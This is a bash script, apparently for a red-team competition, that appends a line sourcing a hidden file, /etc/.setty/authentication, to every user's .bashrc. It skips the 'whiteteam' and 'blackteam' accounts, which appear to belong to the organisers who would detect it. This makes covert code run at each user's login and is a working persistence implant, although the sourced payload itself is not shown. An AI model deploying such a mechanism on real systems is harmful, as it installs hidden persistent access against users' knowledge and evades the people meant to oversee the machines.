#!/bin/bash

# This script takes a specified file and adds it to all of the .bashrc files for all users, 
# except for specific usernames.

# Path to the file you want to add to .bashrc
FILE_TO_ADD="/etc/.setty/authentication"

# List of usernames to exclude
EXCLUDED_USERS=("whiteteam" "blackteam" "Whiteteam" "Blackteam" "WhiteTeam" "BlackTeam")

# Loop through all home directories
for dir in /home/*; do
    if [[ -d "$dir" ]]; then
        # Extract the username from the home directory path
        USERNAME=$(basename "$dir")

        # Check if the username is in the exclusion list
        if [[ " ${EXCLUDED_USERS[@]} " =~ " $USERNAME " ]]; then
            echo "Skipping $USERNAME..."
            continue
        fi

        USER_BASHRC="$dir/.bashrc"

        # Check if .bashrc exists
        if [[ -f "$USER_BASHRC" ]]; then
            # Check if the line is already present
            if ! grep -q "source $FILE_TO_ADD" "$USER_BASHRC"; then
                echo "Adding source line to $USER_BASHRC"
                echo "source $FILE_TO_ADD" >> "$USER_BASHRC"
            else
                echo "Already added in $USER_BASHRC, skipping..."
            fi
        fi
    fi
done

echo "Done!"
